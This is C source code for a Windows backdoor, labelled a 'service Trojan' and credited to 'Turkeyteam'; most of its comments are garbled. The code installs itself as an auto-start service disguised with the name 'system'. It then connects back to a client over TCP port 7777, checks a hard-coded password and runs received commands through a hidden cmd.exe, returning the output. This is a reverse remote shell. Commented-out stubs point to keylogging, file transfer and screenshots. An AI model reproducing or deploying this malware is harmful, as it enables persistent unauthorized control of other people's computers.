//service Trojan
/*
#include<stdio.h>
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")
*/
#include "Trojan.h"

void WINAPI ServiceMain(DWORD, LPTSTR *);   //���������� 
DWORD WINAPI CmdService(LPVOID);  //CMD 
DWORD WINAPI CmdShell(LPVOID);
void WINAPI ServiceCtrlHandler(DWORD Opcode);   //������ƺ��� 
BOOL InstallCmdService();  //��װ������ 
void DelServices();  //ɾ�������� 
int door();    //���ź��� 
void Usage(void);  //��ʾ��Ϣ 
void WINAPI EXEBackMain(LPVOID s);   //CMD���� 
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;

#define PASSSUCCESS "Password success!\n"
#define PASSERROR "Password error!\n"
#define BYEBYE "Byebye!\n"
#define WSAerron WSAGetLastError()
#define erron GetLastError()
#define PORT 7777
#define DEST_IP_ADDR "127.0.0.1"  //�ͻ��˵�IP��ַ

int main(int argc, char *argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] = 
	{
		{"system", ServiceMain}, //����������ڵ� 
		{NULL, NULL}
	//SERVICE_TABLE_ENTRY�ṹ������NULL���� 
	};
	if(argc == 1) //InstallCmdService();//BackDoor();
	{	
		//InstallCmdService();
		//InstallCmdService();
		BackDoor();
		//system("pause");
	}
	if(argc == 2)
	{
		if(!stricmp(argv[1], "-i"))  //ִ�а�װ�������� 
		{
			InstallCmdService();
		}
		else if(!stricmp(argv[1],"-r"))
		{
			DelServices();
		}
		else if(!stricmp(argv[1], "-s"))
		{
			BackDoor();
		}
		else
		{
			Usage();
		}
		return 0;
	 } 
	 StartServiceCtrlDispatcher(DispatchTable);
	 return 0;
 } 

int door()
{
	SOCKET sock = NULL;
	struct sockaddr_in sai;
	TCHAR UserPass[20] = {0};  //�û��������뻺�� 
	TCHAR PassBuf[20] = {0};   //�������뻺�� 
	TCHAR PassBanner[] = "Password:";
	TCHAR Banner[] = "-------------backdoor------------------\n";
	TCHAR Options[] = "Please input the number: 1.CMD 2.KeyLog 3.FileTrans 4.PrtSc\n";
	char Recv[5];//�����ַ�
	int Op = 0; 
	sai.sin_family = AF_INET;
	sai.sin_addr.s_addr = inet_addr(DEST_IP_ADDR);
	sai.sin_port = htons(PORT);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	while(TRUE)
	{
		WSADATA wsadata;
		BOOL ThreadFlag = FALSE;
		DWORD ThreadID = 0;
		int nRet = 0;
		nRet = WSAStartup(MAKEWORD(2,2), &wsadata);  //��ʼ��
		if(nRet)
		{
			return 0;
		 } 
		sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sock == INVALID_SOCKET)
		{
			goto Clean;
		}
		nRet = connect(sock,(struct sockaddr*)&sai,sizeof(struct sockaddr));
		Sleep(5000);
		if(nRet != SOCKET_ERROR)
		{
			nRet = send(sock, Banner, sizeof(Banner), 0);
			
			while(TRUE)
			{	
				nRet = send(sock, PassBanner, sizeof(PassBanner), 0);
				nRet = recv(sock,PassBuf,sizeof(PassBuf)-1,0);
				if(strnicmp(PassBuf,"dirdir",strlen("dirdir")) == 0)
				{
					send(sock, PASSSUCCESS, sizeof(PASSSUCCESS), 0);
					BackDoor();
			/*		if(send(sock, Options, sizeof(Options), 0)){
					printf("send successfully");
					}
					memset(Recv,0,1);
					nRet = recv(sock, Recv, 5,0);
					printf("%c",Recv[0]);
					if(nRet > 0)
					{
						Op = atoi(Recv);
						switch(Op)
						{
							case 1:
								CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain, (LPVOID)sock, 0, &ThreadID);
								break;
							case 2:
								KeyLog();
								break;
							case 3:
								printf("123");
								File(sock);
								break;
							case 4:
								break;	
						}				
					}*/
				}
				memset(PassBuf,0,1);
				if(nRet = SOCKET_ERROR)
				{
					goto Clean;
				}
				Sleep(100);
			}
/*			if(ThreadFlag)
			{
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain, (LPVOID)sock, 0, &ThreadID);
			}
*/
		}//����if 
		Sleep(1000); 
	 } 
	 Clean:
	 	if(sock != NULL)
	 		closesocket(sock);
	 	WSACleanup();
	 	return 0;	
}

//����������
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
{
	m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	//������Խ��ܵ�������������ֻ����ֹͣ�����������ͣ�ָ����� 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_ServiceStatus.dwWin32ExitCode = 0;
	m_ServiceStatus.dwServiceSpecificExitCode = 0;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
	//ServiceCtrlHandler������ƺ�������������ʼ���ָ�����ͣ��ֹͣ����ȿ��Ʋ��� 
	if(m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
	//���÷���״̬
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	//�������ServiceStatus()����Ӧ������Ƴ���ÿ�ε�����֪ͨ��ServiceStatus�ṹ����7����Ա�����Ƿ�Ӧ���������״̬
	//���еĳ�Ա���ڽṹ�����ݵ�SetServiceStatus֮ǰ��ȷ���� 
	if(SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
		bRunning = true;
		BackDoor();  //�������ǵķ��� 
		return; 
 } 

//������ƺ���
void WINAPI ServiceCtrlHandler(DWORD Opcode)
{
	switch(Opcode)
	{
		case SERVICE_CONTROL_PAUSE:   //ʹ��pause������ֹ����
			m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		 	break;
		case SERVICE_CONTROL_CONTINUE:  //ʹ��continue�����������
			m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:   //ʹ��stopֹͣ���� 
			m_ServiceStatus.dwWin32ExitCode = 0; 
			m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			m_ServiceStatus.dwCheckPoint = 0;
			m_ServiceStatus.dwWaitHint = 0;
			SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
			bRunning = false;
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
			
	}
	return;
 } 

//��װ������
BOOL InstallCmdService()
{
	char strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);  //ȡ��ǰĿ¼ 
	GetModuleFileName(NULL, strDir, sizeof(strDir));  //ȡ��ǰ�ļ�·�����ļ��� 
	char chSysPath[1024];
	GetSystemDirectory(chSysPath,sizeof(chSysPath));  //ȡϵͳĿ¼ 
	strcat(chSysPath,"\\system.exe");//��systemƴ�ӵ�ϵͳ��Ŀ¼ 
	if(CopyFile(strDir,chSysPath,FALSE)) //�ѷ�������Ƶ�ϵͳ��Ŀ¼���������� 
		printf("Copy file OK\n");
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		printf("open scmanager failed, maybe you do not have the privilege to do this\n");
		return false; 
	 } 
	LPCTSTR lpszBinaryPathName = strDir;
	//��������Ϣ��ӵ�SCM�����ݿ⣬������Ϊsystem����ʾ������Ϊsystem
	schService = CreateService(schSCManager, "system", 
	"system",  //���������Ϣ��ӵ�SCM�����ݿ���
	SERVICE_ALL_ACCESS,  //����Ȩ��
	SERVICE_WIN32_OWN_PROCESS,  //��������
	SERVICE_AUTO_START,   //��������
	SERVICE_ERROR_NORMAL,   //�����������
	lpszBinaryPathName,   //������
	NULL,
	NULL,
	NULL,
	NULL,
	NULL 
	);
	if(schService)
		printf("Install Service Success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
 } 

//ɾ���������
void DelServices()
{
	char name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, "system");
	if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if(!service)
	{
		printf("OpenService error!");
		return;
	}
	BOOL isSuccess = QueryServiceStatus(service, &status);
	if(!isSuccess)
	{
		printf("QueryServiceStatus error!");
		return;
	}
	if(status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if(!isSuccess)
			printf("Stop Service error!");
		Sleep(500);
	}
	isSuccess = DeleteService(service);
	if(!isSuccess)
		printf("Delete Service Fail!");
	else
		printf("Delete Service Success!");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
 } 

//cmd����
void WINAPI EXEBackMain(LPVOID s)
{
	SOCKET sock = (SOCKET)s;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;
	TCHAR CmdSign[] = "\nGood luck!\\>";
	while(TRUE)
	{
		TCHAR MsgError[50] = {0};   //������Ϣ���� 
		TCHAR Cmdline[300] = {0};   //�����л��� 
		TCHAR RecvBuf[1024] = {0}; //���ܻ��� 
		TCHAR SendBuf[2048] = {0};   //���ͻ��� 
		SECURITY_ATTRIBUTES sa;
		DWORD bytesRead = 0;
		int ret = 0;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		//���������ܵ�
		if(!CreatePipe(&hRead, &hWrite, &sa, 0))
		{
			goto Clean;
		 } 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si);
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;   //����CMD�����д��ܵ� 
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		GetSystemDirectory(Cmdline, sizeof(Cmdline));   //��ȡϵͳ��Ŀ¼ 
		strcat(Cmdline, "\\cmd.exe /c");  //ƴ��CMD 
		//ret = send(sock, CmdSign, sizeof(CmdSign), 0);  //��Ŀ�귢����ʾ�� 
		if(ret == SOCKET_ERROR)
		{
			goto Clean; 
		 } 
		ret = recv(sock, RecvBuf, sizeof(RecvBuf), 0);  //����Ŀ������ ��Ϊexit,quit�˳� 
		//printf("4444\n");
		if(strnicmp(RecvBuf, "exit",4) == 0 || strnicmp(RecvBuf, "quit", 4) == 0)
		{
			send(sock,BYEBYE,sizeof(BYEBYE), 0);
			goto Clean; 
		 } 
		//��ʾ�Է��Ѿ��Ͽ�
		if(ret == SOCKET_ERROR) 
		{
			goto Clean; 
		}
		//��ʾ���ݽ��ܳ���
		if(ret <= 0)
		{
			#ifdef DEBUGMSG
				sprintf(MsgError,"recv() GetlastError reports %d\n", WSAerron);
				send(sock, MsgError, sizeof(MsgError), 0);
			#endif
			continue; 
		 } 
		Sleep(100);
		strncat(Cmdline, RecvBuf, sizeof(RecvBuf));   //ƴ��һ��������cmd����
		//printf("%s\n",Cmdline);
		//�������̣�Ҳ����ִ��CMD����
		if(!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		{
			continue;
		 } 
		CloseHandle(hWrite);
		while(TRUE)  //ѭ����ȡ�ܵ��е����ݣ�ֱ��û������ 
		{
			if(ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL) == 0)
				break;
			send(sock, SendBuf, bytesRead, 0); //���ͳ�ȥ
			//printf("5555\n");
			memset(SendBuf, 0, sizeof(SendBuf));//��������
			Sleep(100); 
	    }	
	}
	Clean: //�ͷž��
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		//�ͷ�socket
		if(sock != NULL)
			closesocket(sock);
		WSACleanup();
		ExitThread(0);
		//return 0 
 } 

void Usage()
{
	fprintf(stderr, "Code by Turkeyteam\n""Usage:%s[-i][-r]-i:install service;-r:remove service.\n");
}














